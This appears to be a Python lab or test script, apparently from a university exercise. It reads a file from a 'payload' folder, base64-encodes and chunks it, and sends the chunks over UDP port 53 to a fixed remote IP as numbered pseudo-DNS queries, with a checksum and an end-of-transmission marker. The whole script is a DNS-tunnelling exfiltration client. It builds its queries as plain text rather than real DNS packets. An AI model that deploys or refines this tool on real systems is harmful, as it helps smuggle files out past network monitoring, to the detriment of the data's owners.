import socket
import logging
import os
import hashlib
import base64

# Function to generate checksum for a given file
def generate_checksum(file_path):
    try:
        hash_md5 = hashlib.md5()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()
    except Exception as e:
        logging.error(f"Error generating checksum for file {file_path}: {e}")
        return None

# Configure logging to display information, including the timestamp, log level, and the message
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("send_file_test.log"),
        logging.StreamHandler()
    ]
)

# Function to encode data in base64 format
def encode_base64(data):
    try:
        encoded = base64.urlsafe_b64encode(data).decode('utf-8')
        return encoded.rstrip('=')
    except Exception as e:
        logging.error(f"Error encoding base64 data: {e}")
        return None

# Function to pad encoded data to a specific block size
def pad_encoded_data(encoded_data, block_size=64):
    padding_size = block_size - (len(encoded_data) % block_size)
    padded_data = encoded_data + ('=' * padding_size)
    return padded_data

# Function to chunk data into smaller pieces
def chunk_data(data, chunk_size=512):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

# Function to send file as DNS queries
def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60):
    file_path = os.path.join(os.getcwd(), 'payload', filename)

    # Generate the checksum of the file
    checksum = generate_checksum(file_path)
    logging.info(f"Checksum: {checksum}")

    try:
        # Read and process the entire image file
        with open(file_path, 'rb') as file:
            image_data = file.read()

        # Base64 encode the entire image data
        encoded_data = encode_base64(image_data)
        if not encoded_data:
            logging.error("Failed to encode image data.")
            return

        # Pad the encoded data
        padded_data = pad_encoded_data(encoded_data)

        # Chunk the data
        chunks = chunk_data(padded_data, chunk_size)

        # Send each chunk as a DNS query
        for packet_number, chunk in enumerate(chunks, start=1):
            packet_number_str = str(packet_number).zfill(4)
            query = f"{packet_number_str}:{chunk}.towson.edu:{checksum}"

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
                client_socket.sendto(query.encode(), (server_ip, server_port))
                logging.info(f"Sent query: {query}")

        # Send an end of transmission signal
        end_of_transmission = "END".zfill(4) + ":END_OF_TRANSMISSION.towson.edu:" + checksum
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
            client_socket.sendto(end_of_transmission.encode(), (server_ip, server_port))
            logging.info("Sent end of transmission signal")

    except Exception as e:
        logging.error(f"Error sending file as DNS queries: {e}")

if __name__ == "__main__":
    send_file_as_dns_queries("image.jpg", "172.16.223.86")
